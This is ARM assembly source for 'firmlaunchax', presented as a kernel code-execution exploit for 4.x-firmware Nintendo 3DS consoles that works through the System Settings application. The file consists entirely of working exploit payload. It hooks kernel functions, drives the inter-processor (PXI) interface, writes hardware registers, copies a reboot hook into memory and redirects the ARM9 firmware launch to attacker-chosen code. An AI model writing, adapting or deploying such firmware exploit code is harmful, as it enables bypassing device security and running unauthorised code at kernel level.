;;-----------------------------------------------;;
;;   firmlaunchax - arm9 kernel code execution   ;;
;;       on mset (system settings) exploit.      ;;
;;             FOR 4.X CONSOLES ONLY             ;;
;;   -Roxas75                                    ;;
;;-----------------------------------------------;;

.nds
.create "build/arm9hax.bin", 0x1FFF4C80
.arm

jump_table:
    b func_patch_hook
    b reboot_function

    func_patch_hook:
        stmfd sp!, {r0-r12,lr}
        mov r0, #0
        bl pxi_send
        bl pxi_sync
        mov r0, #0x10000
        bl pxi_send
        bl pxi_recv
        bl pxi_recv
        bl pxi_recv
        ldr r1, =0xFFFD0000
        strb r0, [r1,#0x230]
        mov r0, #0x10
        bl busy_spin
        mov r0, #0
        strb r0, [r1,#0x230]
        mov r0, #0x10
        bl busy_spin
        ldmfd sp!, {r0-r12,lr}
            ldr r0, =0x44836
            str r0, [r1]
            ldr pc, =0xFFF84DDC
            k11_inf_loop:
                b k11_inf_loop

    reboot_function:
        ldr r0, =arm11_reboot_hook
        ldr r1, =invalidate_allcache
        ldr r2, =0x1FFFFC00
        mov r4, r2
        bl copy_mem
        bx r4

    copy_mem:
        sub r3, r1, r0
        mov r1, r3,asr#2
        cmp r1, #0
        ble copy_mem_ret
        movs r1, r3,lsl#29
        sub r0, r0, #4
        sub r1, r2,	#4
        bpl copy_mem_loc1
        ldr r2, [r0,#4]!
        str r2, [r1,#4]!
        copy_mem_loc1:
            movs r2, r3,asr#3
            beq copy_mem_ret
        copy_mem_loc2:
            ldr r3, [r0,#4]
            subs r2, r2, #1
            str r3, [r1,#4]
            ldr	r3, [r0,#8]!
            str	r3, [r1,#8]!
            bne	copy_mem_loc2
        copy_mem_ret:
            bx lr
.pool

    arm11_reboot_hook:
        mov r0, #0x1FFFFFF8
        mov r1, #0
        str r1, [r0]
        ldr r1, =0x10163008
        ldr r2, =0x44846
        str r2, [r1]
        ldr r8, =0x10140000
        ldr r10, =0x2400000C
        ldr r9, =0x22F00000
        mrs r0, cpsr
        orr r0, r0, #0x1C0
        msr cpsr_cx, r0

        reboot_wait:
            ldrb r0, [r8]
            ands r0, #1
            bne reboot_wait
        str r9, [r10]
        mov r0, #0x1FFFFFF8

        reboot_wait_arm9:
            ldr r1, [r0]
            cmp r1, #0
            beq reboot_wait_arm9
        bx r1
.pool

    invalidate_allcache:
        mov r0, #0
        mcr p15, 0, r0,c8,c5, 0
        mcr p15, 0, r0,c8,c6, 0
        mcr p15, 0, r0,c8,c7, 0
        mcr p15, 0, r0,c7,c10, 4
        bx lr

    invalidate_dcache:
        mov r0, #0
        mcr p15, 0, r0,c7,c14, 0
        mcr p15, 0, r0,c7,c10, 4
        bx lr

    invalidate_icache:
        mov r0, #0
        mcr p15, 0, r0,c7,c5, 0
        mcr p15, 0, r0,c7,c5, 4
        mcr p15, 0, r0,c7,c5, 6
        mcr p15, 0, r0,c7,c10, 4
        bx lr

    busy_spin:
        subs r0, #2
        nop
        bgt busy_spin
        bx lr

    pxi_send:
        ldr r1, =0xFFFD2000
		pxi_send_l1:
            ldrh r2, [r1,#4]
            tst r2, #2
            bne pxi_send_l1
        str r0, [r1,#8]
        bx lr

    pxi_sync:
        ldr r0, =0xFFFD2000
        ldrb r1, [r0,#3]
        orr r1, #0x40
        strb r1, [r0,#3]
        bx lr

    pxi_recv:
        ldr r0, =0xFFFD2000
		pxi_recv_l1:
            ldrh r1, [r0,#4]
            tst r1, #0x100
            bne pxi_recv_l1
        ldr r0, [r0,#0xC]
        bx lr

.pool
.close
